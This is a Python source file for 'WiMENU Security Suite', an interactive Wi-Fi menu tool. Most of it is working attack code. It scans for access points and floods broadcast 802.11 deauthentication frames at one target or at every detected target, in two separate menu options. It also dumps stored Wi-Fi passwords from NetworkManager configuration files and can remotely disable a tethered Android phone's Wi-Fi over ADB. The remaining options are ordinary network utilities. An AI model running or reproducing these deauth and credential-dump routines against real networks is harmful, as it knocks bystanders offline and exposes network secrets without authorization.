#!/usr/bin/env python3
import sys
import time
import subprocess
import os
import configparser
import socket
import urllib.request
import json
import re

# Import di scapy protetto per evitare blocchi silenziosi
try:
    from scapy.all import *
except ImportError:
    pass

devices = {}

# ANSI Color Codes
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

def print_banner():
    subprocess.run(["clear"])
    banner = r"""
        .......=                 $$\     $$\ $$$$$$\        $$\     $$\ $$$$$$\$$\ $$\  $$\ $$\  $$\ 
      +............-             $$ | $\ $$ |\_$$  _|       $$$\   $$$ |$$  _____|$$$\ $$ |$$ | $$ |
    ++...............-           $$ |$$$\ $$ |  $$ |         $$$$\ $$$$ |$$ |      $$$$\$$ |$$ | $$ |
    =++.................         $$ $$ $$\$$ |  $$ |         $$\$$\$$ $$ |$$$$$\    $$\$$ $$ |$$ | $$ |
    +++:=..................-     $$$$  _$$$$ |  $$ |         $$ \$$$  $$ |$$  __|   $$ \$$$$ |$$ | $$ |
      ==+....................:   $$$  / \$$$ |  $$ |         $$ |\$  /$$ |$$ |      $$ |\$$$ |$$ | $$ |
      ===+......................         *+-=  =* \$$$$$$\    $$ | \_/ $$ |$$$$$$$$\ $$ | \$$ |\$$$$$$  |
       +++++. .................:-=+= =-+=--*++  \______|  \__|     \__|\________|\__|  \__| \______/ 
        ++*+................:::..:-:=* =----=-=+=+
        +=+++:........:.....:::...:...+::===:-==++
         *+*=+=........::...........:::. :-:==+=-+
         *+*++*+..................:......::  -+--
          *++++*+:.....................:::.= : -
          ***+**+*+...................::..::.=--
           *******++-:-::----........::.....:::
          **#**+#**+*+:............::.....::.:::
          *#*#####**+*+=..:.......:........:::::::
           +##*#*#**+++*+-......:.........:.:..::::
      +=+   ###**%#*+*+*+++:...............::::..:.:-
     ++++ +#%##%#*#***+++++............:....::::::.:
    =++***#%##*##**#*#**++++++:..........:....::::::::
    +++*+#%%###%###%###****+++++=.:.....:.......::::::::
      ####%%%#*####*##********++++=...::.........:.::::::
      +###%*##*###*#%#**#****+++++.............::::::::
     #*##%*###**#***# #*********+++++=-............:::::::
    *#  ##%*#%*****%##******#******+++++=..........:::::::-
  #*    ##%%*%*****##### **#*#*****+**=++++=.....::::::::::
 *#     %%######****###***%*##    ##***+#=+++=-....::::::::
"""
    print(GREEN + banner + RESET)
    print(f"{CYAN}================================================================================{RESET}")
    print(f"{YELLOW}                            WiMENU SECURITY SUITE                               {RESET}")
    print(f"{CYAN}================================================================================{RESET}\n")

def packet_handler(pkt):
    if pkt.haslayer(Dot11):
        if pkt.type == 0 and pkt.subtype in [4, 8]:
            bssid = pkt.addr2
            if bssid and bssid not in devices:
                devices[bssid] = len(devices) + 1
                print(f"{GREEN}[{devices[bssid]}] Target detected ---> {CYAN}{bssid}{RESET}")

def send_deauth(target_bssid, iface):
    print(f"\n{RED}[!] Sending packets to: {target_bssid} on {iface}{RESET}")
    print(f"{YELLOW}[!] Press Ctrl+C to stop.{RESET}")
    try:
        pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=7)
        while True:
            sendp(pkt, iface=iface, count=5, inter=0.1, verbose=0)
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{GREEN}[+] Operation cancelled.{RESET}")

# [1] WIFI JOIN WITH CUSTOM NAME
def wifi_join_with_name():
    print(f"\n{GREEN}========================================={RESET}")
    print(f"{GREEN}     WIFI JOIN WITH CUSTOM NAME          {RESET}")
    print(f"{GREEN}========================================={RESET}")
    
    ssid = input(f"{CYAN}[?] Enter Network Name (SSID): {RESET}").strip()
    pwd = input(f"{CYAN}[?] Enter Password: {RESET}").strip()
    custom_name = input(f"{CYAN}[?] Enter display name for router (e.g. SmartTV, iPhone): {RESET}").strip()
    
    print(f"\n{YELLOW}[+] Connecting to '{ssid}'...{RESET}")
    try:
        cmd_connect = ["sudo", "nmcli", "device", "wifi", "connect", ssid, "password", pwd]
        res = subprocess.run(cmd_connect, capture_output=True, text=True)
        
        if res.returncode != 0:
            print(f"{RED}[✖] Connection error: {res.stderr.strip()}{RESET}")
            input(f"\n{CYAN}[Enter] to return to menu...{RESET}")
            return

        print(f"{YELLOW}[+] Applying custom hostname '{custom_name}'...{RESET}")
        subprocess.run(["sudo", "hostnamectl", "set-hostname", custom_name], capture_output=True, text=True)
        subprocess.run(["sudo", "nmcli", "connection", "modify", ssid, "ipv4.dhcp-hostname", custom_name], capture_output=True, text=True)
        subprocess.run(["sudo", "nmcli", "connection", "down", ssid], capture_output=True, text=True)
        subprocess.run(["sudo", "nmcli", "connection", "up", ssid], capture_output=True, text=True)
        
        print(f"{GREEN}[✔] Done! Hostname set to '{custom_name}' and connection renewed.{RESET}")
        
    except Exception as e:
        print(f"{RED}[-] Unexpected error: {e}{RESET}")
        
    input(f"\n{CYAN}[Enter] to return to menu...{RESET}")

# [2] WIFI SCAN / DEAUTH TEST
def wifi_deauth():
    iface = input(f"{CYAN}[?] Enter network interface (e.g. wlan0mon): {RESET}").strip()
    print(f"\n{YELLOW}[+] Scan started on {iface}. Press Ctrl+C to stop...{RESET}\n")
    
    devices.clear()
    try:
        sniff(iface=iface, prn=packet_handler, store=0)
    except KeyboardInterrupt:
        print(f"\n{GREEN}[+] Scan stopped.{RESET}")
        
    if not devices:
        print(f"{RED}[-] No targets found.{RESET}")
        return

    print(f"\n{CYAN}========================================={RESET}")
    print(f"{GREEN}            DISCOVERED TARGETS           {RESET}")
    print(f"{CYAN}========================================={RESET}")
    for bssid, num in devices.items():
        print(f"  {YELLOW}[{num}]{RESET} -> {CYAN}{bssid}{RESET}")
    print(f"{CYAN}========================================={RESET}")
        
    scelta = input(f"\n{CYAN}[?] Enter target number or 'all': {RESET}").strip()
    
    if scelta.lower() == 'all':
        print(f"\n{RED}[!] Global Mode: Targeting ALL detected devices!{RESET}")
        for bssid in devices.keys():
            send_deauth(bssid, iface)
    else:
        try:
            num_scelto = int(scelta)
            target_bssid = [bssid for bssid, num in devices.items() if num == num_scelto][0]
            print(f"\n{GREEN}[+] Selected target [{num_scelto}] -> {target_bssid}{RESET}")
            send_deauth(target_bssid, iface)
        except (ValueError, IndexError):
            print(f"{RED}[-] Invalid selection!{RESET}")

# [3] WIFI PASSWORD LOCAL DUMP
def wifi_password_local():
    print(f"\n{GREEN}========================================={RESET}")
    print(f"{GREEN}         LOCAL WIFI PASSWORDS DUMP       {RESET}")
    print(f"{GREEN}========================================={RESET}")
    
    path = "/etc/NetworkManager/system-connections/"
    try:
        files = os.listdir(path)
    except PermissionError:
        print(f"{RED}[!] You must run this script with root privileges!{RESET}")
        return

    found = False
    for file in files:
        file_path = os.path.join(path, file)
        try:
            with open(file_path, "r", errors="ignore") as f:
                content = f.read()
                print(f" {YELLOW}File / Profile Name:{RESET} {file}")
                print(f"{CYAN}{content.strip()}{RESET}")
                print("-" * 40)
                found = True
        except Exception:
            pass

    if not found:
        print(f"{YELLOW}[-] No saved Wi-Fi profiles found.{RESET}")
    input(f"\n{CYAN}[Enter] to return to menu...{RESET}")

# [4] NETWORK INFO & WIFI PROFILES MANAGER
def network_modem_info():
    print(f"\n{GREEN}========================================={RESET}")
    print(f"{GREEN}     NETWORK INFO & PROFILES MANAGER     {RESET}")
    print(f"{GREEN}========================================={RESET}")
    
    print(f" {YELLOW}[1]{RESET} View Network & Modem Info Report")
    print(f" {YELLOW}[2]{RESET} Delete saved Wi-Fi profile")
    print(f" {YELLOW}[3]{RESET} Add/Create saved Wi-Fi profile manually\n")
    
    sub_choice = input(f"{CYAN}[?] Choose an option (1-3): {RESET}").strip()
    
    if sub_choice == '1':
        print(f"\n{YELLOW}[+] Fetching network details (Offline safe)...{RESET}")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('10.255.255.255', 1))
            ip_privato = s.getsockname()[0]
            s.close()
        except Exception:
            ip_privato = "Offline / Not Connected"
            
        ip_pubblico = "Offline"
        nationality = "Offline"
        try:
            req = urllib.request.urlopen('http://ip-api.com/json/', timeout=2)
            data = json.loads(req.read().decode('utf-8'))
            if data.get('status') == 'success':
                ip_pubblico = data.get('query', 'Unknown')
                nationality = f"{data.get('country', 'Unknown')} ({data.get('countryCode', '')}) - {data.get('isp', '')}"
        except Exception:
            try:
                ip_pubblico = urllib.request.urlopen('https://api.ipify.org', timeout=2).read().decode('utf8')
            except Exception:
                ip_pubblico = "Offline / No Internet"

        connection_name = "Not Connected"
        security_type = "Unknown"
        try:
            nm_out = subprocess.run(["nmcli", "-t", "-f", "ACTIVE,SSID,SECURITY", "dev", "wifi"], capture_output=True, text=True)
            for line in nm_out.stdout.splitlines():
                if line.startswith("yes:"):
                    parts = line.split(":")
                    if len(parts) >= 3:
                        connection_name = parts[1] if parts[1] else "Hidden SSID"
                        security_type = parts[2] if parts[2] else "Open / None"
                    break
        except Exception:
            pass

        gateway_ip = "Unknown"
        gateway_mac = "Unknown"
        manufacturer = "Unknown"
        try:
            ip_route = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True)
            match = re.search(r'via\s+([0-9.]+)', ip_route.stdout)
            if match:
                gateway_ip = match.group(1)
            if os.path.exists('/proc/net/arp'):
                with open('/proc/net/arp', 'r') as f:
                    for line in f.readlines()[1:]:
                        parts = line.split()
                        if len(parts) >= 4 and parts[0] == gateway_ip:
                            gateway_mac = parts[3]
                            break
            if gateway_mac != "Unknown":
                try:
                    url = f"https://api.macvendors.com/{gateway_mac}"
                    req_mac = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                    manufacturer = urllib.request.urlopen(req_mac, timeout=2).read().decode('utf-8').strip()
                except Exception:
                    manufacturer = f"MAC: {gateway_mac}"
        except Exception:
            manufacturer = "Not Connected"

        print(f"\n{CYAN}-----------------------------------------{RESET}")
        print(f" {GREEN}PUBLIC IP       :{RESET} {ip_pubblico}")
        print(f" {GREEN}PRIVATE IP      :{RESET} {ip_privato}")
        print(f" {GREEN}CONNECTION NAME :{RESET} {connection_name}")
        print(f" {GREEN}MANUFACTURER    :{RESET} {manufacturer}")
        print(f" {GREEN}SECURITY        :{RESET} {security_type}")
        print(f" {GREEN}NATIONALITY/ISP :{RESET} {nationality}")
        print(f"{CYAN}-----------------------------------------{RESET}")

    elif sub_choice == '2':
        ssid_del = input(f"{CYAN}[?] Enter exact SSID name of the Wi-Fi to delete: {RESET}").strip()
        if ssid_del:
            res = subprocess.run(["sudo", "nmcli", "connection", "delete", ssid_del], capture_output=True, text=True)
            if res.returncode == 0:
                print(f"{GREEN}[✔] Wi-Fi profile '{ssid_del}' successfully deleted!{RESET}")
            else:
                print(f"{RED}[✖] Error: Profile not found.{RESET}")

    elif sub_choice == '3':
        ssid_add = input(f"{CYAN}[?] Enter SSID name to add: {RESET}").strip()
        pwd_add = input(f"{CYAN}[?] Enter Wi-Fi Password: {RESET}").strip()
        if ssid_add and pwd_add:
            res = subprocess.run(["sudo", "nmcli", "device", "wifi", "connect", ssid_add, "password", pwd_add], capture_output=True, text=True)
            if res.returncode == 0:
                print(f"{GREEN}[✔] Wi-Fi profile '{ssid_add}' successfully added!{RESET}")
            else:
                print(f"{RED}[✖] Error: {res.stderr.strip()}{RESET}")
        else:
            print(f"{RED}[-] Invalid input fields.{RESET}")
            
    input(f"\n{CYAN}[Enter] to return to menu...{RESET}")

# [5] DELETE OR CREATE WIFI HOTSPOT
def hotspot_manager():
    print(f"\n{GREEN}========================================={RESET}")
    print(f"{GREEN}         DELETE OR CREATE HOTSPOT        {RESET}")
    print(f"{GREEN}========================================={RESET}")
    print(f" {YELLOW}[1]{RESET} Create new Hotspot AP")
    print(f" {YELLOW}[2]{RESET} Delete existing Hotspot AP\n")
    
    hs_choice = input(f"{CYAN}[?] Choose an option (1-2): {RESET}").strip()
    if hs_choice == '1':
        iface = input(f"{CYAN}[?] Enter wireless interface (e.g. wlan0): {RESET}").strip()
        ssid = input(f"{CYAN}[?] Enter new SSID name for the Hotspot: {RESET}").strip()
        pwd = input(f"{CYAN}[?] Enter custom WPA2 Password (min 8 chars): {RESET}").strip()
        try:
            cmd = ["sudo", "nmcli", "device", "wifi", "hotspot", "ifname", iface, "ssid", ssid, "password", pwd]
            res = subprocess.run(cmd, capture_output=True, text=True)
            if res.returncode == 0:
                print(f"{GREEN}[✔] Hotspot successfully created!{RESET}")
            else:
                print(f"{RED}[✖] Error: {res.stderr.strip()}{RESET}")
        except Exception as e:
            print(f"{RED}[-] Error: {e}{RESET}")
    elif hs_choice == '2':
        ssid_del = input(f"{CYAN}[?] Enter Hotspot SSID name to delete: {RESET}").strip()
        if ssid_del:
            res = subprocess.run(["sudo", "nmcli", "connection", "delete", ssid_del], capture_output=True, text=True)
            if res.returncode == 0:
                print(f"{GREEN}[✔] Hotspot successfully deleted!{RESET}")
            else:
                print(f"{RED}[✖] Error: Not found.{RESET}")
                
    input(f"\n{CYAN}[Enter] to return to menu...{RESET}")

# [6] IP CHANGER
def ip_changer():
    print(f"\n{GREEN}========================================={RESET}")
    print(f"{GREEN}       IP CHANGER (RENEW DHCP LEASE)     {RESET}")
    print(f"{GREEN}========================================={RESET}")
    active_ssid = None
    try:
        nm_out = subprocess.run(["nmcli", "-t", "-f", "ACTIVE,SSID", "dev", "wifi"], capture_output=True, text=True)
        for line in nm_out.stdout.splitlines():
            if line.startswith("yes:"):
                active_ssid = line.split(":")[1]
                break
    except Exception:
        pass
        
    if not active_ssid:
        print(f"{RED}[✖] Error: No active Wi-Fi connection found!{RESET}")
        input(f"\n{CYAN}[Enter] to return to menu...{RESET}")
        return

    print(f"{YELLOW}[+] Renewing DHCP lease for '{active_ssid}'...{RESET}")
    try:
        subprocess.run(["sudo", "nmcli", "connection", "down", active_ssid], capture_output=True, text=True)
        time.sleep(1)
        res = subprocess.run(["sudo", "nmcli", "connection", "up", active_ssid], capture_output=True, text=True)
        if res.returncode == 0:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('10.255.255.255', 1))
            new_ip = s.getsockname()[0]
            s.close()
            print(f"{GREEN}[✔] New Private IP assigned: {CYAN}{new_ip}{RESET}")
        else:
            print(f"{RED}[✖] Failed to renew IP.{RESET}")
    except Exception as e:
        print(f"{RED}[-] Error: {e}{RESET}")
        
    input(f"\n{CYAN}[Enter] to return to menu...{RESET}")

# [7] IP FINDER
def ip_finder():
    print(f"\n{GREEN}========================================={RESET}")
    print(f"{GREEN}             NEARBY IP FINDER            {RESET}")
    print(f"{GREEN}========================================={RESET}")
    print(f"{YELLOW}[+] Scanning available Wi-Fi networks in range...{RESET}\n")
    
    networks = []
    try:
        res = subprocess.run(["nmcli", "-t", "-f", "SSID,BSSID,SIGNAL,SECURITY", "dev", "wifi"], capture_output=True, text=True)
        for line in res.stdout.splitlines():
            parts = line.split(":")
            if len(parts) >= 4 and parts[0]:
                ssid = parts[0]
                bssid = parts[1]
                signal = parts[2]
                security = parts[3]
                if ssid not in [n['ssid'] for n in networks]:
                    networks.append({'ssid': ssid, 'bssid': bssid, 'signal': signal, 'security': security})
    except Exception:
        pass

    if not networks:
        print(f"{RED}[-] No Wi-Fi networks found nearby.{RESET}")
        input(f"\n{CYAN}[Enter] to return to menu...{RESET}")
        return

    print(f"{CYAN}--------------------------------------------------------------------------------{RESET}")
    for i in range(0, len(networks), 2):
        net1 = f"[{i+1}] {networks[i]['ssid']} (Sig: {networks[i]['signal']}%)"
        col1 = f"{YELLOW}{net1:<40}{RESET}"
        
        col2 = ""
        if i + 1 < len(networks):
            net2 = f"[{i+2}] {networks[i+1]['ssid']} (Sig: {networks[i+1]['signal']}%)"
            col2 = f"{YELLOW}{net2:<40}{RESET}"
            
        print(f"{col1} {col2}")
    print(f"{CYAN}--------------------------------------------------------------------------------{RESET}")

    choice = input(f"\n{CYAN}[?] Select network number to get IP info: {RESET}").strip()
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(networks):
            selected = networks[idx]
            print(f"\n{GREEN}[✔] Selected Network: {CYAN}{selected['ssid']}{RESET}")
            print(f" {YELLOW}BSSID / MAC :{RESET} {selected['bssid']}")
            print(f" {YELLOW}Signal      :{RESET} {selected['signal']}%")
            print(f" {YELLOW}Security    :{RESET} {selected['security']}")
            
            try:
                url = f"https://api.macvendors.com/{selected['bssid']}"
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                vendor = urllib.request.urlopen(req, timeout=2).read().decode('utf-8').strip()
                print(f" {YELLOW}Router Brand:{RESET} {vendor}")
            except Exception:
                print(f" {YELLOW}Router Brand:{RESET} Unknown / Restricted")
        else:
            print(f"{RED}[-] Invalid number selected.{RESET}")
    except ValueError:
        print(f"{RED}[-] Please enter a valid number.{RESET}")
        
    input(f"\n{CYAN}[Enter] to return to menu...{RESET}")

# [8] INSTANT USB DEAUTH (MULTI-OS + FULL/CLEAN ADB MODES)
def instant_usb_deauth():
    print(f"\n{GREEN}========================================={RESET}")
    print(f"{GREEN}      INSTANT USB DEAUTH (MULTI-OS)      {RESET}")
    print(f"{GREEN}========================================={RESET}")
    
    print(f"{CYAN}Select Target Device Operating System:{RESET}")
    print(f" {YELLOW}[1]{RESET} Android (USB Deauth / Full Wi-Fi Kill Modes)")
    print(f" {YELLOW}[2]{RESET} Windows / Linux / macOS (Air RF Deauth Attack)\n")
    
    os_choice = input(f"{CYAN}[?] Choose OS option (1-2): {RESET}").strip()
    
    if os_choice == '1':
        print(f"\n{YELLOW}Choose Android Attack Mode:{RESET}")
        print(f" {YELLOW}[1]{RESET} Standard Smart ADB Disconnect (Reconnects automatically)")
        print(f" {YELLOW}[2]{RESET} FULL Deauth USB (Drops connection, enables Airplane Mode, and LEAVES Wi-Fi DISABLED)\n")
        
        mode_choice = input(f"{CYAN}[?] Choose mode (1-2): {RESET}").strip()
        
        print(f"\n{YELLOW}[+] Running background check: adb devices ...{RESET}")
        try:
            subprocess.run(["adb", "start-server"], capture_output=True)
            res = subprocess.run(["adb", "devices"], capture_output=True, text=True)
            
            devices_list = []
            for line in res.stdout.splitlines():
                line = line.strip()
                if not line or line.startswith("*") or line.startswith("List"):
                    continue
                parts = line.split()
                if len(parts) >= 2:
                    dev_id = parts[0]
                    status = parts[1]
                    if status == "device":
                        devices_list.append(dev_id)
                    elif status == "unauthorized":
                        print(f"{RED}[!] Device {dev_id} is UNAUTHORIZED! Check your phone screen and accept the prompt.{RESET}")
                        
            if not devices_list:
                print(f"{RED}[✖] No authorized Android devices detected via USB.{RESET}")
                input(f"\n{CYAN}[Enter] to return to menu...{RESET}")
                return
                
            print(f"\n{CYAN}Connected Android Devices:{RESET}")
            for idx, dev_id in enumerate(devices_list, 1):
                print(f" {YELLOW}[{idx}]{RESET} Device ID: {GREEN}{dev_id}{RESET}")
                
            choice = input(f"\n{CYAN}[?] Enter device number: {RESET}").strip()
            dev_idx = int(choice) - 1
            
            if 0 <= dev_idx < len(devices_list):
                target_dev = devices_list[dev_idx]
                
                if mode_choice == '1':
                    print(f"\n{YELLOW}[+] Performing standard clean disconnect on device {target_dev}...{RESET}")
                    subprocess.run(["adb", "-s", target_dev, "shell", "cmd", "connectivity", "airplane-mode", "enable"], capture_output=True)
                    time.sleep(1.2)
                    subprocess.run(["adb", "-s", target_dev, "shell", "cmd", "connectivity", "airplane-mode", "disable"], capture_output=True)
                    print(f"{GREEN}[✔] Standard clean reset completed successfully!{RESET}")
                    
                elif mode_choice == '2':
                    print(f"\n{RED}[!] Executing FULL Deauth USB on device {target_dev}...{RESET}")
                    subprocess.run(["adb", "-s", target_dev, "shell", "cmd", "connectivity", "airplane-mode", "enable"], capture_output=True)
                    time.sleep(1.5)
                    subprocess.run(["adb", "-s", target_dev, "shell", "svc", "wifi", "disable"], capture_output=True)
                    print(f"{GREEN}[✔] FULL Deauth executed! Wi-Fi has been disabled and Airplane Mode triggered.{RESET}")
                    print(f"{YELLOW}[!] Note: You must manually turn Wi-Fi back on from the target phone when needed.{RESET}")
                else:
                    print(f"{RED}[-] Invalid mode selected.{RESET}")
            else:
                print(f"{RED}[-] Invalid number selected.{RESET}")
        except Exception as e:
            print(f"{RED}[-] Error executing adb command: {e}{RESET}")
            
    elif os_choice == '2':
        iface = input(f"{CYAN}[?] Enter wireless interface (e.g. wlan0mon): {RESET}").strip()
        gateway_bssid = "Unknown"
        try:
            ip_route = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True)
            match = re.search(r'via\s+([0-9.]+)', ip_route.stdout)
            if match:
                gw_ip = match.group(1)
                with open('/proc/net/arp', 'r') as f:
                    for line in f.readlines()[1:]:
                        parts = line.split()
                        if len(parts) >= 4 and parts[0] == gw_ip:
                            gateway_bssid = parts[3]
                            break
        except Exception:
            pass

        target_bssid = input(f"{CYAN}[?] Enter Router BSSID / Target MAC [{gateway_bssid}]: {RESET}").strip()
        if not target_bssid:
            target_bssid = gateway_bssid
            
        if target_bssid == "Unknown" or not target_bssid:
            print(f"{RED}[✖] Error: No valid target MAC specified!{RESET}")
            input(f"\n{CYAN}[Enter] to return to menu...{RESET}")
            return

        print(f"\n{YELLOW}[!] Initializing RF Deauth Attack... Press Ctrl+C to stop.{RESET}\n")
        try:
            pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=7)
            while True:
                sendp(pkt, iface=iface, count=10, inter=0.05, verbose=0)
                print(f"{GREEN}[+] Deauth burst sent...{RESET}")
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{GREEN}[+] Attack stopped by user.{RESET}")
    else:
        print(f"{RED}[-] Invalid choice.{RESET}")
        
    input(f"\n{CYAN}[Enter] to return to menu...{RESET}")

def main():
    while True:
        print_banner()
        print(f" {YELLOW}[1]{RESET} Wifi Join with Name      {YELLOW}[5]{RESET} Delete / Create Hotspot AP")
        print(f" {YELLOW}[2]{RESET} Wifi Scanner / Deauth      {YELLOW}[6]{RESET} IP Changer (DHCP Renew)")
        print(f" {YELLOW}[3]{RESET} Wifi Password Local      {YELLOW}[7]{RESET} IP Finder (List & Select)")
        print(f" {YELLOW}[4]{RESET} Network Manager Info     {YELLOW}[8]{RESET} Instant USB Deauth (Multi-OS)")
        print(f" {YELLOW}[0]{RESET} Exit\n")
        
        scelta = input(f"{CYAN}[?] Enter choice: {RESET}").strip()
        
        if scelta == '1':
            wifi_join_with_name()
        elif scelta == '2':
            wifi_deauth()
        elif scelta == '3':
            wifi_password_local()
        elif scelta == '4':
            network_modem_info()
        elif scelta == '5':
            hotspot_manager()
        elif scelta == '6':
            ip_changer()
        elif scelta == '7':
            ip_finder()
        elif scelta == '8':
            instant_usb_deauth()
        elif scelta == '0':
            print(f"\n{GREEN}[+] Exiting WiMENU. Goodbye!{RESET}")
            sys.exit(0)
        else:
            print(f"{RED}[-] Invalid option. Please enter a valid number.{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()

